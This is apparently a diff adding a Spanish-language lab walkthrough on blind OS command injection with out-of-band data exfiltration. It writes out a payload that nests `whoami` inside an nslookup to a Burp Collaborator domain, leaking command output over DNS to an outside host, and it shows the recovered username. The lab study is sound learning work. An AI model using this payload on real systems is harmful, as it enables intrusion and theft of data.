@@ -148,5 +148,43 @@ Ahora verificamos en el home del laboratorio si lo completamos.
 
 ## 5. Lab: Blind OS command injection with out-of-band data exfiltration
 
+Como en el laboratorio entramos al **Burp Collaborator Client**, y damos clic en **Copy to clipboard**, con lo cual obtenemos el siguiente:
+
+```bash
+8v4zmihu5jygfrhzktqssad7gympae.burpcollaborator.net
+```
+
+Ahora interceptamos el paquete del feedback como en el ejemplo anterior y lo enviamos al repeater y para este caso, debemos obtener la salida de un comando así que anidaremos dos comandos usando esta vez el caracter **`** (tilde invertida) y el payload será de la siguiente manera.
+
+```bash
+$(nslookup `whoami`.8v4zmihu5jygfrhzktqssad7gympae.burpcollaborator.net)
+```
+
+Lo cual en el intruder quedaria de la siguiente manera y lo enviamos.
+
+![](img17.png)
+
+Podemos ver en nuestra ventana de **Burp Collaborator Client**, podemos ver que si se realizaron las consultas dns.
+
+![](img18.png)
+
+Y como podemos ver la consulta dns se hizo a **peter-xR6lKE.8v4zmihu5jygfrhzktqssad7gympae.burpcollaborator.net**. Entonces la respuesta del comando whoami sería.
+
+```bash
+peter-xR6lKE
+```
+
+Ahora verificamos en el home del laboratorio si lo completamos y nos pide que ingresemos el valor que obtuvimos.
+
+![](img19.png)
+
+Y luego de ello podemos ver que tenemos el laboratorio resuelto al fin :D
+
+![](img20.png)
+
+## CONCLUSION
+
+Estos ejercicios son un poco mas sencillos pero nos sirve para aprender las diferentes formas en la que se puede presentar un Command Injection, que aunque parezca poco todavia hay sitios webs que los usan, y obviamente la mayoria de estos son de modo a ciegas.
+
 
 
